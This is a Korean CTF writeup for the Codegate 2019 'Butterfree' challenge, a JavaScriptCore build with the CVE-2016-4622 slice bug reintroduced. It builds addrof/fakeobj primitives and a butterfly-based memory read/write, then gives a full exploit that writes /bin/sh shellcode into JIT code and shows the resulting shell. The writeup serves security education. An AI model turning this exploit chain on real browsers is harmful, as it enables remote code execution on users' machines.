---
title: "[Writeup] Butterfree - Codegate '19"
layout: post
date: '2019-04-08 17:00:00 -0700'
tag:
- browser
headerImage: true
category: blog
author: null2root
---

작성 - LiLi, y0ny0ns0n, powerprove, cheese @ null2root

# 소개

이 문서에서는 butterfree 문제(2019' Codegate)에 대한 풀이를 다룬다.   
대회 당시에는 readfile() 함수를 사용해서 플래그를 얻었으나, Butterfly 공격을 다시 한번 연습하기 위해 Practice 문제로 선정하였다.

또한 이 문서는 널루트 내부 프로젝트 `how to browser` 에서 작성한 [Attacking JavaScript Engine](https://null2root.github.io/blog/2019/04/06/Attacking-JavaScript-Engines-kor.html), [CVE-2016-4622 분석](https://null2root.github.io/blog/2019/04/09/CVE-2016-4622-digging.html)으로부터 이어지는 문서로, 앞의 두 문서를 먼저 읽기를 권한다.

# 분석

## 문제

```
Butterfree
Download 2018.11.18 Webkit and Modified 

nc 110.10.147.110 17423 

Download 

Download2 
``` 

## 파일

압축을 풀면 64bit Webkit 의 JavaScriptCore 인터프리터 파일(jsc), 소스 코드 일부(ArrayPrototype.cpp), 그리고 실행을 위한 라이브러리(libJavaScriptCore.so.1)가 압축되어 있다
```
w00t@ubuntu1804:~/hack/browser/$ ls -al
-rwxrwxr-x 1 w00t w00t 22786808 Jan 26 18:47 libJavaScriptCore.so.1
-rw-rw-r-- 1 w00t w00t    68854 Jan 15 03:35 ArrayPrototype.cpp
-rwxrwxr-x 1 w00t w00t   258904 Jan 15 01:59 jsc

w00t@ubuntu1804:~/hack/browser/90b70bfa992696d63140ca63fcb035cf/$ file jsc
jsc: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, 
for GNU/Linux 2.6.32, BuildID[sha1]=1194ae5517914e2c9d2f86704e7c4b908f5c5f7b, not stripped
```

## 변경점 분석

우선 `2018년 11월 18일 버전의 Webkit 을 다운로드해서 수정했다` 라는 설명은 풀이를 위한 힌트로, 문제를 풀 때 아래 과정을 진행해야 함을 의미한다.

* Webit를 다운로드한다(git clone)
* 2018년 11월 18일 날짜의 commit을 검색한다(git log)
* 2018년 11월 18일 날짜로 소스를 변경한다(git checkout)
* 원본파일과 수정된 파일을 비교한다(diff -git)

위 순서에 따라 2018년 11월 18일자 커밋의 ArrayPrototype.cpp 파일을 얻어 diff 명령을 수행한다.  
해당 날짜의 파일명을 ArrayPrototype_ori.cpp 로 표기하였다.

* diff --git ArrayPrototype.cpp ArrayPrototype_ori.cpp

```
--- 90/ArrayPrototype.cpp	
+++ 90/ArrayPrototype_ori.cpp	
@@ -973,7 +973,7 @@
     if (UNLIKELY(speciesResult.first == SpeciesConstructResult::Exception))
         return { };
 
-    bool okToDoFastPath = speciesResult.first == SpeciesConstructResult::FastPath && isJSArray(thisObj) /*&& length == toLength(exec, thisObj)*/;
+    bool okToDoFastPath = speciesResult.first == SpeciesConstructResult::FastPath && isJSArray(thisObj) && length == toLength(exec, thisObj);
     RETURN_IF_EXCEPTION(scope, { });
     if (LIKELY(okToDoFastPath)) {
         if (JSArray* result = asArray(thisObj)->fastSlice(*exec, begin, end - begin))
@@ -1636,4 +1636,4 @@
     globalObject->arraySpeciesWatchpoint().fireAll(vm, lazyDetail);
 }
 
-} // namespace JSC
+} // namespace JSC
```

비교 결과 fastSlice 의 코드 일부를 수정했음을 확인할 수 있다. 주석 처리된 length 비교 코드는 [CVE-2016-4622 취약점 수정 커밋](https://github.com/WebKit/webkit/commit/650552a6ed7cac8aed3f53dd464341728984b82f))에서 수정된 부분이다.

덧붙여 문제의 제목이 butterfree 이므로, butterfly 취약점을 알고 있었던 사람이라면 쉽게 추측할 수 있었을 것이다.

## 버그

CVE-2016-4622 의 원본 PoC 코드를 돌려보면 정상적으로 동작하지 않는다. PoC 가 보여주는 결과처럼, 우선 Array 에서의 메모리 릭을 확인하는 것이 우선이다.

        var b = a.slice(0, hax);
        return Int64.fromDouble(b[3]);
				
프랙 문서를 참조하여, addrof() 함수 중 `a.slice(0, hax)[3]` 을 리턴하는 대신 `a.slice(0, hax)` 전체를 리턴하도록 수정하면 메모리 릭이 발생한다는 것을 확인할 수 있다.


```javascript
function addrof_modify(obj){
		var a = []; 
		for (var i = 0; i < 100; i++){
				a.push(i + 0.123);
		}; 
		var b = a.slice(0, { 
				valueOf: function() { 
						a.length = 0; 
						a = [obj]; 
						return 100; 
				}
		});
		return (b)
};

a=[];
print(addrof_modify(a));
```
 

```
root@ubuntu1804:/mnt/hgfs/lili/hack/codegate2019/butterfree/jscpwn# ./jsc poc.js
0.123,1.123,0,6.3659873734e-314,6.9532913969695e-310,0,0,0,0,0,0,0,0,0,0,
```

디버거(gdb)를 실행하여 print 명령어의 내부 함수인 `fucntionPrintStdOut` 함수에 브레이크포인트를 설정한다.  
`print()` 의 인자값을 추적해 보면 Array 내부에 주소값이 저장된 것을 확인할 수 있다

```
gdb-peda$ x/10gx $rdi
0x7fffffffd630:	0x00007fffffffd6b0	0x00007ffff764b50c
0x7fffffffd640:	0x0000000000000000	0x00007fffb24c3000
0x7fffffffd650:	0x00007fff00000002	0x00007fffb24e0000
0x7fffffffd660:	0x00007fffb24b43f0	0x00007fffb24e0000
0x7fffffffd670:	0x00007fffb24c3000	0x000000000000000a

gdb-peda$ x/10gx 0x00007fffb24b43f0
0x7fffb24b43f0:	0x0108210700000062	0x00007fe0000d4378
0x7fffb24b4400:	0x0000000000000000	0x0000000000000000
0x7fffb24b4410:	0x0000000000000000	0x0000000000000000
0x7fffb24b4420:	0x0000000000000000	0x0000000000000000
0x7fffb24b4430:	0x0000000000000000	0x0000000000000000

gdb-peda$ x/10gx 0x00007fe0000d4378
0x7fe0000d4378:	0x3fbf7ced916872b0	0x3ff1f7ced916872b
0x7fe0000d4388:	0x0000000000000000	0x0000000300000001
0x7fe0000d4398:	0x00007fffb24b43c0	0x0000000000000000
0x7fe0000d43a8:	0x0000000000000000	0x0000000000000000
0x7fe0000d43b8:	0x0000000000000000	0x0000000000000000
```

b[3] 을 출력하면 `0x0000000300000001`(`6.3659873734e-314`)를 출력하고, b[4]를 출력하면 포인터 값(`0x00007fffb24b43c0`, `9532913969695e-310`에서 Nan-boxing 해제)를 출력한다.

이로써 CVE-2016-4622 와 완전히 동일한 취약점을 가지고 있음이 확인되었다.

## 배경지식

### JIT Spraying(JIT 스프레이 공격)

동일한 코드를 반복해서 호출하면 JIT 컴파일러가 힙에 실행 가능한 영역을 만들어 낸다.

* JIT Spraying
```
const ITERATIONS = 100000;
function jitCompile(f, ...args) {
    for (var i = 0; i < ITERATIONS; i++) {
        f(...args);
    }
}
jitCompile(function dummy() { return 42; });
```

CVE-2016-4622 프랙 문서의 공격 코드에서 JIT Spraying 을 활용한 함수가 makeJITCompiledFunction() 이다. 

```javascript
function makeJITCompiledFunction() {
    function target(num) {
        for (var i = 2; i < num; i++) {
            if (num % i === 0) {
                return false;
            }
        }
        return true;
    }
    jitCompile(target, 123);

    return target;
}
```

전체적인 공격 과정은 다음과 같다.

1. JIT 컴파일된 함수 객체를 얻는다.
2. 오프셋 계산을 통해 바이트코드가 위치한 주소를 얻는다. 오프셋은 운영체제 버전 혹은 웹킷 버전에 따라 다르므로 디버깅을 통해 확인해야 한다.
3. 해당 주소에 쉘코드를 overwrite 한다.
4. 함수를 호출하여 덮어쓴 쉘코드를 실행한다.


### 형식화 배열 : typed array

자바스크립트에서 형식화 배열(typed array)은 버퍼 및 뷰로 구현되어 있다.   
버퍼는 ArrayBuffer 로 구현하며, 크기만 정할 수 있고 데이터에 대한 접근은 할 수 없다.   
뷰를 통해 데이터를 입력하거나 수정할 수 있다. 뷰는 데이터 타입을 지정한다. 

*출처 : https://developer.mozilla.org/ko/docs/Web/JavaScript/Typed_arrays*

### array 형의 메모리 구조

공격코드의 이해를 위해 TypedArray 가 데이터를 메모리에 어떻게 저장하는지를 이해할 필요가 있다. 상세한 내용은 [프랙 문서](https://null2root.github.io/blog/2019/04/06/Attacking-JavaScript-Engines-kor.html)를 참조한다.

### addrof(), fakeobj()

addrof() - object 의 주소값을 리턴한다.  
fakeobj() - 인자로 주어진 주소 영역을 object 로 읽어들여 해당 object 를 리턴한다.

```javascript
function addrof(obj){
   var a = []; 
	 for (var i = 0; i < 100; i++){
	    a.push(i + 0.123);
		}; 
		var b = a.slice(0, {
		   valueOf: function() { 
			    a.length = 0; 
					a = [obj]; 
					return 100; 
				}
		});
		return Int64.fromDouble(b[4])
	};
	
function fakeobj(addr) {
    var a = [];
    for (var i = 0; i < 100; i++){
        a.push({});
    }

    addr = addr.asDouble();
    return a.slice(0, {
		    valueOf: function() { 
			    a.length = 0; 
			    a = [addr]; 
			    return 100; 
		   }
	 })[4];
}
```

# 풀이

## 공격 벡터

### `vertor` - fail

이미 잘 알려진 취약점이라, 처음에는 프랙 문서의 풀 익스플로잇 코드를 활용하는 방향으로 풀이를 시도했다.  
공격 벡터로 `vector`, 즉  fakeObj 로 얻은 객체 컨테이너의 세번째 qword 값을 사용하는 방식이다.


```javascript
    var hax = new Uint8Array(0x1000);
    var container = {
        jsCellHeader: jsCellHeader.asJSValue(),
        butterfly: false,     
        vector: hax,
        lengthAndFlags: (new Int64('0x0001000000000010')).asJSValue()
    };

	  // 가짜 Float64Array를 생성한다
    var address = Add(addrof(container), 0x10);
    var fakearray = fakeobj(address);

		// 읽기 함수
		read: function(addr, length) { 
            fakearray[2] = addr.asDouble();
            var a = new Array(length);
            for (var i = 0; i < length; i++)
                a[i] = hax[i];
            return a;
        },

		// 쓰기 함수
		write: function(addr, data) {
            fakearray[2] = addr.asDouble();
            for (var i = 0; i < data.length; i++)
                hax[i] = data[i];
        },
```


그러나 이 문제에서는 read/write 가 동작하지 않을 뿐만 아니라, fakeobj 로 얻은 객체에 값을 넣어 보면 우리가 지정한 vector 객체가 아닌 전혀 엉뚱한 주소에 저장되는 것을 알 수 있었다.  

의문을 품고 많은 시간을 들여 디버깅을 진행했으나, 2016년-2018년 사이에 웹킷 구조 변화로 인해 전과 같은 공격은 어려울 것이라는 결론을 내렸으며  
실제로 프랙 원작자(@saelo)를 통해 `GigaCage` 라는 보호기법이 추가되었다는 것을 확인할 수 있었다.

`Gigacage` 에 대해서는 향후에 별도로 정리할 예정이다.


### `butterfly` - success

`vector` 대신 `butterfly`, 즉 fakeObj 로 얻은 객체 컨테이너 두번째 qword 값을 이용한다.  
butterfly 를 사용하는 객체를 만들기 위해 Array 타입의 객체를 만들고 속성(Proterty)를 추가한다.

```javascript

    var victim = [];
    victim.prop = 31337;
```

```javascript
    var JSCellHeader = new Int64([
        0xef, 0xbe, 0xad, 0xde, // TypedArray가 아닌 객체에선 무의미함
        0x06,		                // DoubleShape
        0x2c,		                // Float64ArrayType
        0x08,		                // OverridesGetOwnPropertySlot
        0x01		                // DefinitelyWhite
    ]);

		// butterfly 를 victim으로 설정한다
    var container = {
        header: JSCellHeader.asJSValue(),
        butterfly: victim
    };

		var hax = fakeobj(Add(addrof(container), 0x10));
    var origButterfly = hax[1];


		// read/write 를 위해 객체의 두번째 qword 인 butterfly 를 활용한다.
		read64(addr) {
            hax[1] = Add(addr, 0x10).asDouble();
            return this.addrof(victim.pointer);
        },

		// Write an int64 to the given address.
     writeInt64(addr, int64) {
            hax[1] = Add(addr, 0x10).asDouble();
            victim.pointer = int64.asJSValue();
    },
```



## pwn

아래는 익스플로잇 전체 코드이다.

```javascript
// https://raw.githubusercontent.com/saelo/35c3ctf/master/WebKid/utils.js
load("utils.js");
// https://raw.githubusercontent.com/saelo/35c3ctf/master/WebKid/int64.js
load("int64.js");

// http://shell-storm.org/shellcode/files/shellcode-806.php
shellcode = [ 0x31, 0xC0, 0x48, 0xBB, 0xD1, 0x9D, 0x96, 0x91, 0xD0, 0x8C, 0x97, 0xFF, 0x48, 0xF7, 0xDB, 0x53, 0x54, 0x5F, 0x99, 0x52, 0x57, 0x54, 0x5E, 0xB0, 0x3B, 0x0F, 0x05 ];

// https://github.com/saelo/35c3ctf/blob/44b2a45/WebKid/pwn.js#L40
const ITERATIONS = 100000;
function jitCompile(f, ...args)
{
    for(var i = 0; i < ITERATIONS; i++)
        f(...args);
}

jitCompile(function dummy() { return 42; });

function makeJITCompiledFunction()
{
    function target(num)
    {
        for(var i = 2; i < num; i++)
        {
            if(num % i === 0)
                return false;
        }

        return true;
    }

    jitCompile(target, 123);

    return target;
}

function addrof(obj)
{
    var a = [];
    for(var i = 0; i < 100; i++)
        a.push(i+0.123);

    var b = a.slice(0, {valueOf(){
        a.length = 0;
        a = [obj];
        return 10;
    }});

    return Int64.fromDouble(b[4]);
}
function fakeobj(addr)
{
    var a = [];
    for(var i = 0; i < 100; i++)
        a.push({});

    addr = addr.asDouble();
    var b = a.slice(0, {valueOf(){
        a.length = 0;
        a = [addr];
        return 10;
    }});

    return b[4];
}

function pwn()
{
    var JSCellHeader = new Int64([
        0xef, 0xbe, 0xad, 0xde, // TypedArray가 아닌 객체에선 무의미함
        0x06,		                // DoubleShape
        0x2c,		                // Float64ArrayType
        0x08,		                // OverridesGetOwnPropertySlot
        0x01		                // DefinitelyWhite
    ]);

    var victim = [];
    victim.prop = 31337;
    print("[+] victim = " + addrof(victim));
    
    var container = {
        JSCell : JSCellHeader.asJSValue(),
        Butterfly : victim
    };

    var fakeshape = fakeobj(Add(addrof(container), 0x10));
    print("[+] fakeshape = " + addrof(fakeshape));

    // victim.prop는 (victim's Butterfly - 0x10)에 위치함
    memory = {
        // 0x7fffffff보다 큰 값은 double형 값으로 인코딩되어 버리기에 2 bytes씩 씀
        // 0x7fffffff = 0xffff00007fffffff
        // 0x80000000 = 0x41e1000000000000
        write16bits: function(addr, data) {
            fakeshape[1] = Add(addr, 0x10).asDouble();
            victim.prop = data;
        },

        // Int64 라이브러리를 통해 최대 64bit 만큼 값을 쓸 순 있으나,
        // 그에 해당하는 뷰를 생성할 수 없음
        // ( Float64Array를 사용하려면 값을 8 byte씩 끊어 따로따로 인코딩해줘야 되서 안됨 )
        write64bits: function(addr, data) {
            fakeshape[1] = Add(addr, 0x10).asDouble();
            victim.prop = data.asJSValue();
        },

        write: function(addr, data) {
            if((data.length % 2) != 0)
                data.push(0);

            var uint8View = new Uint8Array(data);
            var uint16View = new Uint16Array(uint8View.buffer);

            for(var i = 0; i < uint16View.length; i++)
                this.write16bits(Add(addr, 2 * i), uint16View[i]);
        },

        read64bits: function(addr) {
            fakeshape[1] = Add(addr, 0x10).asDouble();
            return addrof(victim.prop);
        },

        test: function() {
            var v = {};
            var obj = {p : v};

            var addr = addrof(obj);
            assert(fakeobj(addr).p == v, "addrof and/or fakeobj not worked....-_-");

            var propAddr = Add(addr, 0x10);
            var val = this.read64bits(propAddr);
            assert(val.asDouble() == addrof(v).asDouble(), "read64bits not worked...-_-");

            this.write16bits(propAddr, 0x1337); 
            assert(obj.p == 0x1337, "write16bits not worked...-_-");
        }
    };

    memory.test();
    print("[+] Okay, it is working!");

    print("[+] hiding container from JSC!");
    var empty = {};
    var emptyJSCell = memory.read64bits(addrof(empty));
    memory.write64bits(addrof(container), emptyJSCell);

    var jitFunc = makeJITCompiledFunction();

    var jitFuncAddr = addrof(jitFunc);
    print("[+] JIT Function       = " + jitFuncAddr);

    var execAddr = memory.read64bits(Add(jitFuncAddr, 0x18));
    print("[+] Executable Address = " + execAddr);

    var jitCodeObjAddr = memory.read64bits(Add(execAddr, 0x18));
    print("[+] JIT Object Address = " + jitCodeObjAddr);

    var jitCodeAddr = memory.read64bits(Add(jitCodeObjAddr, 0x160));
    print("[+] RWX Code Area      = " + jitCodeAddr);

    memory.write(jitCodeAddr, shellcode);

    print("[+] Let's pwn it!");
    jitFunc();
}

pwn();
```


가비지 컬렉터 등 내부의 여러 컴포넌트로 인해 reliable 하지는 않으나, 반복해서 공격(<200)한 결과 쉘을 얻을 수 있었다.

```
root@ubuntu1804:/mnt/hgfs/lili/hack/codegate2019/butterfree/jscpwn# ./jsc solved_large.js
0x00007fffb24c84e0
[+] victim @ 0x00007fffb0a206a0
[+] container @ 0x00007fffb24c8c80
[+] limited memory read/write working
[+] shellcode function object @ 0x00007fffb048a1c0
[+] executable instance @ 0x00007fffb2483910
[+] JITCode instance @ 0x00007fffb00c5000
[+] JITCode @ 0x00007fffb2e04c80
#
```

## 참조
* https://github.com/wwkenwong/CTF-Writeup/tree/master/browser/Codegate_CTF_2019_Preliminary_Butterfree
